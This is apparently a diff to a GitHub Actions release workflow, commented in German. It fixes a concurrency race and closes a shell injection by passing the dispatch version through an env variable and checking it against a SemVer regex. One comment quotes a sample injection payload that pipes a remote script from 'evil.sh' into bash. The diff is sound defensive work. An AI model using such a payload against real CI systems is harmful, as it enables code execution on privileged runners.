@@ -46,8 +46,17 @@ on:
 # (ADR 0042 §2.2). `cancel-in-progress: false` weil Release-Laeufe
 # nicht abgebrochen werden duerfen — jeder Tag braucht einen vollen
 # Lauf-Status.
+#
+# F3-HARDENING (Welle-2-Post-Closure-Review-Folge-4): Group-Key
+# basiert auf der resolved Version (Tag-Name), NICHT auf
+# `github.ref`. Sonst wuerden Tag-Push (`refs/tags/v1.0.0`) und
+# Manual-Dispatch (`refs/heads/main`) fuer dieselbe Version
+# parallel laufen koennen — Race-Condition gegen GHCR-Push +
+# Release-Erstellung. `github.event.inputs.version || github.
+# ref_name` resolved zur tatsaechlich-zu-veroeffentlichenden
+# Version (Manual-Input bei Dispatch, Tag-Name bei Push).
 concurrency:
-  group: release-${{ github.ref }}
+  group: release-${{ github.event.inputs.version || github.ref_name }}
   cancel-in-progress: false
 
 # Default-Permissions: write fuer `contents` (Release-Anlage) und
@@ -65,23 +74,51 @@ jobs:
       version: ${{ steps.resolve-refs.outputs.version }}
       ref: ${{ steps.resolve-refs.outputs.ref }}
     steps:
-      # F4-Korrektur (Welle-2-Post-Closure-Review-Folge-3):
-      # Resolve-Refs vor Checkout, damit ALLE nachfolgenden
-      # Steps gegen denselben Tag-Commit arbeiten — egal ob
-      # via Tag-Push oder workflow_dispatch.
-      # - Tag-Push: ref = github.ref (=refs/tags/v...), version
-      #   = github.ref_name.
-      # - workflow_dispatch: ref = refs/tags/${inputs.version}
-      #   (verlangt existierendes Tag), version = inputs.version.
+      # F4-Korrektur (Review-Folge-3): Resolve-Refs vor
+      # Checkout, damit ALLE nachfolgenden Steps gegen
+      # denselben Tag-Commit arbeiten — egal ob via Tag-Push
+      # oder workflow_dispatch.
+      #
+      # F1-HARDENING (Review-Folge-4 Security): inputs.version
+      # wird **per env**-Variable uebergeben (NICHT direkt in
+      # die Shell interpoliert) und gegen ein striktes
+      # SemVer-Tag-Pattern validiert. Direkte
+      # `${{ inputs.version }}`-Substitution in `run:` waere
+      # eine klassische Shell-Injection-Vulnerability (Job
+      # haelt `contents: write` + `packages: write`); ein
+      # Manual-Dispatch-Input `"; curl evil.sh | bash; "`
+      # koennte den Runner unterwandern. Regex-Validierung
+      # gegen `v<major>.<minor>.<patch>[-<prerelease>]`
+      # blockiert jede Nicht-Tag-Eingabe vor weiterer
+      # Verarbeitung.
       - name: Resolve refs (version + tag ref)
         id: resolve-refs
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          DISPATCH_VERSION: ${{ inputs.version }}
+          PUSH_REF: ${{ github.ref }}
+          PUSH_REF_NAME: ${{ github.ref_name }}
         run: |
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            VERSION="${{ inputs.version }}"
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            # Strikte SemVer-Tag-Validierung (bash extended
+            # regex, SemVer 2.0.0-kompatibel mit getrennten
+            # `-prerelease`- und `+buildmetadata`-Suffixen).
+            # Erlaubt: v1.2.3, v0.0.1-rc1, v10.20.30-beta.1,
+            # v1.0.0+meta, v10.20.30-beta.1+meta. Verboten:
+            # alles andere (Shell-Metazeichen, Pfad-Traversal,
+            # leere Strings, fehlende v-Prefix).
+            if [[ ! "$DISPATCH_VERSION" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-[a-zA-Z0-9.-]+)?(\+[a-zA-Z0-9.-]+)?$ ]]; then
+              echo "::error::Invalid version input: '$DISPATCH_VERSION'. Expected SemVer tag (e.g. v0.1.0, v1.2.3-rc1, v1.0.0+meta, v10.20.30-beta.1+meta)."
+              exit 1
+            fi
+            VERSION="$DISPATCH_VERSION"
             REF="refs/tags/$VERSION"
           else
-            VERSION="${{ github.ref_name }}"
-            REF="${{ github.ref }}"
+            # Tag-Push: github.ref_name ist Tag-Name (von
+            # GitHub validiert, von push.tags-Pattern
+            # `v*.*.*` gefiltert).
+            VERSION="$PUSH_REF_NAME"
+            REF="$PUSH_REF"
           fi
           echo "version=$VERSION" >> "$GITHUB_OUTPUT"
           echo "ref=$REF" >> "$GITHUB_OUTPUT"
